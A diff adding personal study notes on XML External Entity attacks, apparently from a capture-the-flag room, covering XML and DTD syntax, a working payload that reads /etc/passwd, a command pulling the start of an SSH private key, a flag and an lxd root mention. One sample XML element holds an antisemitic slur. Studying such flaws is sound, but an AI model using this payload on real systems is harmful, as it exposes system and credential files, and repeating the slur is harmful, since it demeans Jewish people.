@@ -1,0 +1,131 @@
+
+
+XML eXternal Entity
+=====================
+
+This is a vulnerability, that can allow attacker to read the files on system just like LFI. The difference is, it's origin is from XML, whereas LFI is common directory traversal via browser.
+
+Scope:
+	- Can cause DoS attack (small payload executing over and over again)
+	- Can lead to port scanning
+	- RCE
+	- SSRF
+
+Types of XXE attacks, mainly:
+
+	- In-band - Attacker receives immediate response to the XXE payload
+	- Out-of-band - No response is received and the attacker needs to reflect the output to another file on the server and then view it.
+
+eXtensible Markup Language
+----------------------------
+
+- It is a markup language for storing and transferring data, in both human-readable and machine-readable format.
+
+- Like a <!DOCTYPE html> prolog isn't necessary, similarly... it is a good practice to include XML prolog.
+
+Syntax:
+	
+	<?xml version="1.0" encoding="UTF-8"?> 
+
+- Every XML document has a root element, else considered a syntax error.
+
+- It is a case-sensitive language; and like html it can also has attributes like:
+
+	<mail from="meinkamph"> Jewish Bitches </mail>
+
+A common body syntax of an XML script is.
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<pjrox>
+	<realName> Paramjot Singh </realName>
+	<age> 19 </age>
+	<work time="night"> Red Teaming </work>
+	<relationship> Siera 117 after the Ending:H4 </relationship>
+</pjrox>
+
+```
+
+- We validate the XML documents against its schema.
+
+DTD - Document Type Definition
+-------------------------------
+
+- Defines the legal structure for a XML document; saved as .dtd extension.
+
+Syntax for a normal DTD file would be like...
+
+```
+<!DOCTYPE pjrox [<!ELEMENT pjrox (realName,age,work,relationship)> <!ELEMENT realName (#PCDATA)> <!ELEMENT age (#PCDATA)> <!ELEMENT work (#PCDATA)> <!ELEMENT relationship (#PCDATA)> ]>
+
+```
+
+Now, suppose this code is in a file called 'check.dtd', well that file can be included in the xml document that needs to be checked for it's syntax.
+
+```
+<?xml version="1.0" encoding="UTF=8"?>
+
+<!DOCTYPE pjrox SYSTEM "note.dtd">
+<pjrox>
+	<realName> Paramjot Singh </realName>
+	<age> 19 </age>
+	<work time="night"> Red Teaming </work>
+	<relationship> Sierra 117 after the Ending:H4 </relationship>
+</pjrox>
+
+```
+
+That check.dtd is an external entity, means somewhere outside of the document file, inside the system.
+	- This can also include external links... 
+	- SYSTEM is a keyword for importing a file from the SYSTEM.
+
+!DOCTYPE - used to define root element
+!ELEMENT - defines that what are child elements of other elements (if any) and what type are they(child and parent elements). In our case it was #PCDATA which means to include all characters available on a keyboard.
+
+
+Note: We can define DTD inside XML document using the <!DOCTYPE> tag.
+
+XXE Payload
+-------------
+
+We are gonna see 2 examples, first one is very easy...
+
+```
+<!DOCTYPE userInfo [<!ENTITY name "pjrox">]>   #### Here we are defining dtd and will be used throughout the file.
+
+<userInfo>
+	<firstName>Spartan</firstName>
+	<secondName>&name;</secondName>
+</userInfo>
+
+```
+
+NOTE: SEMI-COLON IS A MUST.
+
+Second one:
+	
+```
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY arg SYSTEM "file:///etc/passwd">]>
+
+<root>
+	&arg;
+</root>
+
+```
+
+As thought, this payload will define a root element 'root' and an ENTITY named arg, which will get it's value from the SYSTEM, file: /etc/passwd. and Then in the body, of root we will display the value of 'arg' parameter.
+
+Exploiting
+------------
+
+Fuck!! This was easier than the tutorial lmao....
+
+First 18 characters of ssh key of user falcon?
+
+	CMD: cat id_rsa | grep -E "^.{18}" 
+	First 18 characters: MIIEogIBAAKCAQEA7b
+
+user.txt Flag: 34447308044820445174
+
+I also, rooted the box, with lxd privilege escalation... But no flag was there on the machine.
